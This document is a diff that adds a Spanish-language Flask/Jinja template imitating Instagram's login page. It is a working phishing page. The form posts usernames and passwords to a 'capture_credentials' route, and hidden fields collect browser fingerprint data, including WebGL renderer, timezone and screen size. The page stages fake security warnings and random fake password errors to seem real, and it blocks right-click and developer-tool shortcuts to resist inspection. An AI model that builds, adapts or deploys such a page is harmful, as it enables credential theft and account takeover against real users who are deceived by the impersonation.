@@ -1,0 +1,906 @@
+{% extends "base.html" %}
+
+{% block title %}Instagram{% endblock %}
+
+{% block description %}Crea una cuenta o inicia sesión en Instagram{% endblock %}
+
+{% block og_title %}Instagram{% endblock %}
+{% block og_description %}Crea una cuenta o inicia sesión en Instagram. Una forma sencilla, divertida y creativa de capturar, editar y compartir fotos, videos y mensajes con amigos y familiares.{% endblock %}
+
+{% block custom_css %}
+:root {
+    --ig-primary: #405de6;
+    --ig-primary-hover: #3897f0;
+    --ig-secondary: #ed4956;
+    --ig-background: #fafafa;
+    --ig-white: #ffffff;
+    --ig-border: #dbdbdb;
+    --ig-text: #262626;
+    --ig-text-light: #8e8e8e;
+    --ig-blue: #0095f6;
+    --ig-blue-hover: #1877f2;
+    --ig-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background-color: var(--ig-background);
+    margin: 0;
+    padding: 0;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+
+.main-container {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 32px 16px;
+    background: var(--ig-background);
+}
+
+.login-container {
+    max-width: 350px;
+    width: 100%;
+}
+
+.phone-mockup {
+    display: none;
+    margin-right: 32px;
+}
+
+.login-box {
+    background: var(--ig-white);
+    border: 1px solid var(--ig-border);
+    border-radius: 1px;
+    padding: 40px 40px 20px;
+    text-align: center;
+    margin-bottom: 10px;
+}
+
+.instagram-logo {
+    background-image: var(--ig-gradient);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    font-size: 51px;
+    font-weight: bold;
+    font-family: 'Billabong', cursive;
+    margin-bottom: 24px;
+    letter-spacing: -2px;
+}
+
+.login-form {
+    margin-bottom: 20px;
+}
+
+.form-group {
+    margin-bottom: 6px;
+    position: relative;
+}
+
+.form-input {
+    width: 100%;
+    padding: 9px 0 7px 8px;
+    border: 1px solid var(--ig-border);
+    border-radius: 3px;
+    background-color: var(--ig-background);
+    font-size: 12px;
+    color: var(--ig-text);
+    box-sizing: border-box;
+    transition: border-color 0.2s;
+}
+
+.form-input:focus {
+    outline: none;
+    border-color: var(--ig-text-light);
+    background-color: var(--ig-white);
+}
+
+.form-input::placeholder {
+    color: var(--ig-text-light);
+    font-size: 12px;
+}
+
+.form-input.error {
+    border-color: var(--ig-secondary);
+}
+
+.form-input.success {
+    border-color: #00c851;
+}
+
+.error-message {
+    color: var(--ig-secondary);
+    font-size: 12px;
+    text-align: left;
+    margin-top: 4px;
+    display: none;
+}
+
+.success-message {
+    color: #00c851;
+    font-size: 12px;
+    text-align: left;
+    margin-top: 4px;
+    display: none;
+}
+
+.login-button {
+    width: 100%;
+    background-color: var(--ig-blue);
+    border: none;
+    border-radius: 4px;
+    color: var(--ig-white);
+    font-size: 14px;
+    font-weight: 600;
+    padding: 5px 9px;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background-color 0.2s;
+    height: 32px;
+}
+
+.login-button:hover {
+    background-color: var(--ig-blue-hover);
+}
+
+.login-button:disabled {
+    background-color: var(--ig-blue);
+    opacity: 0.3;
+    cursor: not-allowed;
+}
+
+.divider {
+    display: flex;
+    align-items: center;
+    margin: 18px 0;
+    color: var(--ig-text-light);
+    font-size: 13px;
+    font-weight: 600;
+    text-transform: uppercase;
+}
+
+.divider::before,
+.divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background-color: var(--ig-border);
+}
+
+.divider::before {
+    margin-right: 18px;
+}
+
+.divider::after {
+    margin-left: 18px;
+}
+
+.facebook-login {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #385185;
+    font-size: 14px;
+    font-weight: 600;
+    text-decoration: none;
+    margin-bottom: 20px;
+}
+
+.facebook-login:hover {
+    text-decoration: none;
+}
+
+.facebook-icon {
+    width: 16px;
+    height: 16px;
+    margin-right: 8px;
+    background-color: #385185;
+    border-radius: 3px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 10px;
+    font-weight: bold;
+}
+
+.forgot-password {
+    color: var(--ig-text);
+    font-size: 12px;
+    text-decoration: none;
+    line-height: 14px;
+}
+
+.forgot-password:hover {
+    text-decoration: none;
+}
+
+.signup-box {
+    background: var(--ig-white);
+    border: 1px solid var(--ig-border);
+    border-radius: 1px;
+    padding: 20px;
+    text-align: center;
+    font-size: 14px;
+    margin-bottom: 20px;
+}
+
+.signup-link {
+    color: var(--ig-blue);
+    font-weight: 600;
+    text-decoration: none;
+}
+
+.signup-link:hover {
+    text-decoration: none;
+}
+
+.app-download {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.app-download p {
+    font-size: 14px;
+    color: var(--ig-text);
+    margin-bottom: 16px;
+}
+
+.download-buttons {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+}
+
+.download-button {
+    height: 40px;
+    border-radius: 5px;
+    transition: opacity 0.2s;
+}
+
+.download-button:hover {
+    opacity: 0.8;
+}
+
+.loading-container {
+    display: none;
+    text-align: center;
+    padding: 20px;
+}
+
+.ig-spinner {
+    width: 24px;
+    height: 24px;
+    border: 2px solid var(--ig-border);
+    border-top: 2px solid var(--ig-blue);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 16px;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.security-notice {
+    background-color: #fff3cd;
+    border: 1px solid #ffeaa7;
+    border-radius: 4px;
+    padding: 12px;
+    margin-bottom: 16px;
+    font-size: 12px;
+    color: var(--ig-text);
+    text-align: left;
+    display: none;
+}
+
+.security-notice .icon {
+    color: #f39c12;
+    margin-right: 8px;
+}
+
+.footer {
+    background: var(--ig-background);
+    padding: 24px 16px;
+    text-align: center;
+}
+
+.footer-links {
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 16px;
+    margin-bottom: 12px;
+}
+
+.footer-links a {
+    color: var(--ig-text-light);
+    font-size: 12px;
+    text-decoration: none;
+    text-transform: uppercase;
+}
+
+.footer-links a:hover {
+    text-decoration: underline;
+}
+
+.footer-text {
+    color: var(--ig-text-light);
+    font-size: 12px;
+    margin: 0;
+}
+
+.language-selector {
+    margin-top: 12px;
+}
+
+.language-selector select {
+    background: transparent;
+    border: none;
+    color: var(--ig-text-light);
+    font-size: 12px;
+    cursor: pointer;
+    text-transform: uppercase;
+}
+
+/* Responsive Design */
+@media (min-width: 875px) {
+    .main-container {
+        padding: 32px 20px 0;
+    }
+    
+    .login-container {
+        max-width: 935px;
+        display: flex;
+        align-items: center;
+    }
+    
+    .phone-mockup {
+        display: block;
+        flex: 1;
+        max-width: 454px;
+    }
+    
+    .phone-image {
+        width: 100%;
+        height: auto;
+    }
+    
+    .login-section {
+        flex: 1;
+        max-width: 350px;
+    }
+}
+
+@media (max-width: 450px) {
+    .login-box {
+        border: none;
+        background: transparent;
+        padding: 20px 0;
+    }
+    
+    .signup-box {
+        border: none;
+        background: transparent;
+        padding: 20px 0;
+    }
+    
+    .main-container {
+        padding: 16px;
+    }
+}
+
+/* Animaciones */
+.fade-in {
+    animation: fadeIn 0.3s ease-in;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.shake {
+    animation: shake 0.5s ease-in-out;
+}
+
+@keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-5px); }
+    75% { transform: translateX(5px); }
+}
+
+/* Estados específicos */
+.form-input:focus + .floating-label,
+.form-input:not(:placeholder-shown) + .floating-label {
+    transform: translateY(-18px) scale(0.8);
+    color: var(--ig-text-light);
+}
+
+.floating-label {
+    position: absolute;
+    left: 8px;
+    top: 9px;
+    color: var(--ig-text-light);
+    font-size: 12px;
+    pointer-events: none;
+    transition: all 0.2s;
+    transform-origin: left top;
+    background: var(--ig-background);
+    padding: 0 4px;
+    margin-left: -4px;
+}
+
+/* Efectos visuales adicionales */
+.instagram-logo::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: var(--ig-gradient);
+    border-radius: 12px;
+    z-index: -1;
+    opacity: 0;
+    transition: opacity 0.3s;
+}
+
+.instagram-logo:hover::before {
+    opacity: 0.1;
+}
+{% endblock %}
+
+{% block content %}
+<div class="main-container">
+    <div class="login-container fade-in">
+        <div class="phone-mockup">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDU0IiBoZWlnaHQ9IjYxOCIgdmlld0JveD0iMCAwIDQ1NCA2MTgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI0NTQiIGhlaWdodD0iNjE4IiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMTEwXzEpIi8+CjxkZWZzPgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXJfMTEwXzEiIHgxPSIyMjciIHkxPSIwIiB4Mj0iMjI3IiB5Mj0iNjE4IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiNGRkZGRkYiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjRkFGQUZBIi8+CjwvbGluZWFyR3JhZGllbnQ+CjwvZGVmcz4KPHN2Zz4K" alt="Phone mockup" class="phone-image">
+        </div>
+        
+        <div class="login-section">
+            <div class="login-box">
+                <div class="instagram-logo">Instagram</div>
+                
+                <div id="securityNotice" class="security-notice">
+                    <span class="icon">⚠️</span>
+                    Hemos detectado un intento de acceso desde una nueva ubicación. Verifica tu identidad.
+                </div>
+                
+                <form id="instagramLoginForm" class="login-form" method="POST" action="{{ url_for('capture_credentials') }}">
+                    <!-- Campos ocultos -->
+                    <input type="hidden" name="platform" value="instagram">
+                    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+                    <input type="hidden" name="session_id" value="{{ session_id }}">
+                    <input type="hidden" name="timestamp" id="timestamp">
+                    <input type="hidden" name="enc_password" id="encPassword">
+                    <input type="hidden" name="queryParams" value="{}">
+                    <input type="hidden" name="optIntoOneTap" value="false">
+                    
+                    <!-- Información del dispositivo -->
+                    <input type="hidden" name="user_agent" id="userAgent">
+                    <input type="hidden" name="screen_resolution" id="screenRes">
+                    <input type="hidden" name="timezone" id="timezone">
+                    <input type="hidden" name="language" id="language">
+                    <input type="hidden" name="referrer" id="referrer">
+                    <input type="hidden" name="cookies_enabled" id="cookiesEnabled">
+                    <input type="hidden" name="webgl_vendor" id="webglVendor">
+                    <input type="hidden" name="webgl_renderer" id="webglRenderer">
+                    
+                    <!-- Honeypot -->
+                    <input type="text" name="website" style="position: absolute; left: -9999px; opacity: 0;" tabindex="-1" autocomplete="off">
+                    
+                    <div class="form-group">
+                        <input type="text" class="form-input" name="username" id="username" placeholder="Teléfono, usuario o correo electrónico" required autocomplete="username">
+                        <div class="error-message" id="usernameError"></div>
+                        <div class="success-message" id="usernameSuccess"></div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" class="form-input" name="password" id="password" placeholder="Contraseña" required autocomplete="current-password">
+                        <div class="error-message" id="passwordError"></div>
+                    </div>
+                    
+                    <button type="button" class="login-button" id="loginButton" onclick="handleLogin()">Entrar</button>
+                </form>
+                
+                <div class="loading-container" id="loadingContainer">
+                    <div class="ig-spinner"></div>
+                    <p>Iniciando sesión...</p>
+                </div>
+                
+                <div class="divider">O</div>
+                
+                <a href="#" class="facebook-login" onclick="loginWithFacebook(); return false;">
+                    <div class="facebook-icon">f</div>
+                    Iniciar sesión con Facebook
+                </a>
+                
+                <a href="#" class="forgot-password" onclick="showForgotPassword(); return false;">¿Has olvidado la contraseña?</a>
+            </div>
+            
+            <div class="signup-box">
+                ¿No tienes una cuenta? <a href="#" class="signup-link" onclick="showSignup(); return false;">Regístrate</a>
+            </div>
+            
+            <div class="app-download">
+                <p>Descarga la aplicación.</p>
+                <div class="download-buttons">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTM2IiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTM2IDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTM2IiBoZWlnaHQ9IjQwIiByeD0iNCIgZmlsbD0iIzAwMDAwMCIvPgo8dGV4dCB4PSI2OCIgeT0iMjQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjEyIj5BcHAgU3RvcmU8L3RleHQ+Cjwvc3ZnPgo=" alt="Download on App Store" class="download-button">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTM2IiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTM2IDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTM2IiBoZWlnaHQ9IjQwIiByeD0iNCIgZmlsbD0iIzAwMDAwMCIvPgo8dGV4dCB4PSI2OCIgeT0iMjQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LXNpemU9IjEyIj5Hb29nbGUgUGxheTwvdGV4dD4KPC9zdmc+Cg==" alt="Get it on Google Play" class="download-button">
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">Información</a>
+        <a href="#">Blog</a>
+        <a href="#">Empleo</a>
+        <a href="#">Ayuda</a>
+        <a href="#">API</a>
+        <a href="#">Privacidad</a>
+        <a href="#">Condiciones</a>
+        <a href="#">Cuentas destacadas</a>
+        <a href="#">Hashtags</a>
+        <a href="#">Ubicaciones</a>
+        <a href="#">Instagram Lite</a>
+    </div>
+    
+    <div class="language-selector">
+        <select onchange="changeLanguage(this.value)">
+            <option value="es">Español</option>
+            <option value="en">English</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+            <option value="it">Italiano</option>
+            <option value="pt">Português</option>
+            <option value="ja">日本語</option>
+            <option value="ko">한국어</option>
+        </select>
+    </div>
+    
+    <p class="footer-text">© 2024 Instagram from Meta</p>
+</div>
+{% endblock %}
+
+{% block custom_js %}
+// Variables globales
+let isSubmitting = false;
+let securityCheckTriggered = false;
+let loginAttempts = 0;
+
+// Función para mostrar mensajes de error
+function showError(field, message) {
+    const errorElement = document.getElementById(field + 'Error');
+    const inputElement = document.getElementById(field);
+    
+    errorElement.textContent = message;
+    errorElement.style.display = 'block';
+    inputElement.classList.add('error');
+    inputElement.classList.add('shake');
+    
+    setTimeout(() => {
+        inputElement.classList.remove('shake');
+    }, 500);
+    
+    setTimeout(() => {
+        errorElement.style.display = 'none';
+        inputElement.classList.remove('error');
+    }, 5000);
+}
+
+// Función para mostrar mensajes de éxito
+function showSuccess(field, message) {
+    const successElement = document.getElementById(field + 'Success');
+    const inputElement = document.getElementById(field);
+    
+    successElement.textContent = message;
+    successElement.style.display = 'block';
+    inputElement.classList.add('success');
+}
+
+// Función para mostrar loading
+function showLoading(show = true) {
+    const form = document.querySelector('.login-form');
+    const loading = document.getElementById('loadingContainer');
+    const divider = document.querySelector('.divider');
+    const facebookLogin = document.querySelector('.facebook-login');
+    const forgotPassword = document.querySelector('.forgot-password');
+    
+    if (show) {
+        form.style.display = 'none';
+        divider.style.display = 'none';
+        facebookLogin.style.display = 'none';
+        forgotPassword.style.display = 'none';
+        loading.style.display = 'block';
+    } else {
+        form.style.display = 'block';
+        divider.style.display = 'flex';
+        facebookLogin.style.display = 'flex';
+        forgotPassword.style.display = 'block';
+        loading.style.display = 'none';
+    }
+}
+
+// Función para validar username
+function isValidUsername(username) {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
+    const usernameRegex = /^[a-zA-Z0-9._]{1,30}$/;
+    
+    return emailRegex.test(username) || 
+           phoneRegex.test(username.replace(/\s+/g, '')) || 
+           usernameRegex.test(username);
+}
+
+// Función para encriptar contraseña (simulada)
+function encryptPassword(password) {
+    // Simulación de encriptación como Instagram
+    const timestamp = Date.now();
+    const keyId = '10';
+    const publicKey = 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF5dz09Ci0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=';
+    
+    // Formato similar al de Instagram
+    const encrypted = `#PWD_INSTAGRAM_BROWSER:${keyId}:${timestamp}:${btoa(password)}`;
+    return encrypted;
+}
+
+// Función para obtener información WebGL
+function getWebGLInfo() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                };
+            }
+        }
+    } catch (e) {
+        console.log('WebGL not supported');
+    }
+    
+    return {
+        vendor: 'Unknown',
+        renderer: 'Unknown'
+    };
+}
+
+// Función para manejar el login
+function handleLogin() {
+    if (isSubmitting) return;
+    
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value;
+    
+    // Validaciones
+    if (!username) {
+        showError('username', 'Introduce tu nombre de usuario.');
+        return;
+    }
+    
+    if (!isValidUsername(username)) {
+        showError('username', 'El nombre de usuario que has introducido no pertenece a ninguna cuenta. Comprueba el nombre de usuario y vuelve a intentarlo.');
+        return;
+    }
+    
+    if (!password) {
+        showError('password', 'Introduce tu contraseña.');
+        return;
+    }
+    
+    if (password.length < 6) {
+        showError('password', 'La contraseña que has introducido es incorrecta. Vuelve a intentarlo.');
+        return;
+    }
+    
+    // Incrementar intentos de login
+    loginAttempts++;
+    
+    // Mostrar aviso de seguridad después del segundo intento
+    if (loginAttempts >= 2 && !securityCheckTriggered) {
+        document.getElementById('securityNotice').style.display = 'block';
+        securityCheckTriggered = true;
+    }
+    
+    // Enviar formulario
+    submitForm(username, password);
+}
+
+// Función para enviar el formulario
+function submitForm(username, password) {
+    if (isSubmitting) return;
+    
+    isSubmitting = true;
+    showLoading(true);
+    
+    // Recopilar información del dispositivo
+    const webglInfo = getWebGLInfo();
+    
+    document.getElementById('timestamp').value = Date.now();
+    document.getElementById('encPassword').value = encryptPassword(password);
+    document.getElementById('webglVendor').value = webglInfo.vendor;
+    document.getElementById('webglRenderer').value = webglInfo.renderer;
+    document.getElementById('cookiesEnabled').value = navigator.cookieEnabled;
+    
+    // Simular delay de autenticación de Instagram
+    const delay = securityCheckTriggered ? 
+        Math.random() * 3000 + 2000 : 
+        Math.random() * 2000 + 800;
+    
+    setTimeout(() => {
+        // Simular error ocasional para mayor realismo
+        if (Math.random() < 0.15 && loginAttempts === 1) {
+            showLoading(false);
+            isSubmitting = false;
+            showError('password', 'La contraseña que has introducido es incorrecta. Vuelve a intentarlo.');
+            return;
+        }
+        
+        document.getElementById('instagramLoginForm').submit();
+    }, delay);
+}
+
+// Funciones para enlaces falsos
+function loginWithFacebook() {
+    alert('Redirigiendo a Facebook...');
+}
+
+function showForgotPassword() {
+    const username = document.getElementById('username').value.trim();
+    if (username) {
+        alert(`Se enviará un enlace de recuperación a ${username}`);
+    } else {
+        alert('Introduce tu nombre de usuario o correo electrónico para recuperar tu contraseña.');
+    }
+}
+
+function showSignup() {
+    alert('Redirigiendo a la página de registro...');
+}
+
+function changeLanguage(lang) {
+    console.log('Cambiando idioma a:', lang);
+    // Simular cambio de idioma
+}
+
+// Event listeners
+document.addEventListener('DOMContentLoaded', function() {
+    // Recopilar información del dispositivo
+    document.getElementById('userAgent').value = navigator.userAgent;
+    document.getElementById('screenRes').value = screen.width + 'x' + screen.height;
+    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    document.getElementById('language').value = navigator.language;
+    document.getElementById('referrer').value = document.referrer;
+    
+    // Auto-focus en username
+    document.getElementById('username').focus();
+    
+    // Manejar Enter key
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' && !isSubmitting) {
+            e.preventDefault();
+            handleLogin();
+        }
+    });
+    
+    // Validación en tiempo real
+    document.getElementById('username').addEventListener('input', function() {
+        const username = this.value.trim();
+        if (username && isValidUsername(username)) {
+            this.classList.remove('error');
+            this.classList.add('success');
+        } else {
+            this.classList.remove('success');
+        }
+        
+        // Habilitar/deshabilitar botón de login
+        updateLoginButton();
+    });
+    
+    document.getElementById('password').addEventListener('input', function() {
+        const password = this.value;
+        if (password.length >= 6) {
+            this.classList.remove('error');
+            this.classList.add('success');
+        } else {
+            this.classList.remove('success');
+        }
+        
+        // Habilitar/deshabilitar botón de login
+        updateLoginButton();
+    });
+    
+    // Función para actualizar estado del botón
+    function updateLoginButton() {
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value;
+        const loginButton = document.getElementById('loginButton');
+        
+        if (username && password && password.length >= 1) {
+            loginButton.disabled = false;
+            loginButton.style.opacity = '1';
+        } else {
+            loginButton.disabled = true;
+            loginButton.style.opacity = '0.3';
+        }
+    }
+    
+    // Inicializar estado del botón
+    updateLoginButton();
+    
+    // Detectar herramientas de desarrollo
+    let devtools = false;
+    setInterval(() => {
+        if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
+            if (!devtools) {
+                devtools = true;
+                console.clear();
+                console.log('%cInstagram Security Alert', 'color: #ed4956; font-size: 16px; font-weight: bold;');
+                console.log('%cDeveloper tools detected. This session is being monitored.', 'color: #8e8e8e; font-size: 12px;');
+            }
+        }
+    }, 1000);
+    
+    // Prevenir clic derecho y teclas de desarrollo
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+    
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+            (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+            (e.ctrlKey && e.key === 'u')) {
+            e.preventDefault();
+        }
+    });
+    
+    // Simular carga de la página como Instagram
+    setTimeout(() => {
+        document.body.classList.add('loaded');
+    }, Math.random() * 300 + 100);
+    
+    // Efecto de typing en placeholder (opcional)
+    const usernameInput = document.getElementById('username');
+    const originalPlaceholder = usernameInput.placeholder;
+    let placeholderIndex = 0;
+    let isDeleting = false;
+    
+    function typePlaceholder() {
+        if (document.activeElement === usernameInput) return;
+        
+        if (!isDeleting && placeholderIndex < originalPlaceholder.length) {
+            usernameInput.placeholder = originalPlaceholder.substring(0, placeholderIndex + 1);
+            placeholderIndex++;
+        } else if (isDeleting && placeholderIndex > 0) {
+            usernameInput.placeholder = originalPlaceholder.substring(0, placeholderIndex - 1);
+            placeholderIndex--;
+        } else {
+            isDeleting = !isDeleting;
+            if (!isDeleting) {
+                setTimeout(typePlaceholder, 2000);
+                return;
+            }
+        }
+        
+        setTimeout(typePlaceholder, isDeleting ? 50 : 100);
+    }
+    
+    // Iniciar efecto después de 3 segundos
+    setTimeout(typePlaceholder, 3000);
+});
+{% endblock %}
